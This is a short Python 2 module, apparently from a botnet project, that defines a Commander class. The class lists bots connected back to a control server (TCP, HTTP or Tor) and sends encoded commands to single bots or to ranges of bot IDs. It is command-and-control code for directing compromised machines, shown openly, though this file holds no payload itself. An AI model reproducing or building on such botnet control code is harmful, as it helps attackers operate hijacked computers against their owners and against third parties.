'''
Created on Dec 14, 2013

@author: Onur
'''

from bisect import bisect_left, bisect_right

class Commander(object):
    """ Runs or sends commands
        
        This class is used to run local commands 
        and send remote commands to bots
        
        Attributes:
            __server: the server that bots connect back.
    """
    
    __server = None

    def __init__(self, server):
        """ Initializes Commander with a server (TCP, HTTP, Tor)"""
        self.__server = server
    
    def listClients(self):
        """ Gets clients' list from the server and
            prints it to the screen """
        print self.__server.getClientsList() 
    
    def sendCommand(self, interval, cmd):
        """ Sends a command to the clients in the given interval"""        
        
        cids = self.__server.getClientIds()        
    
        for c in cids:   
            if int(c) >= interval[0] and int(c) <= interval[1]:
                self.__server.sendData(c, cmd.getEncodedCommand())
        
        return True
    
    def sendSingleCommand(self, cid, cmd):
        """ Sends a command to the given client"""    
        self.__server.sendData(cid, cmd.getEncodedCommand())
    
    def getServer(self):
        return self.__server

            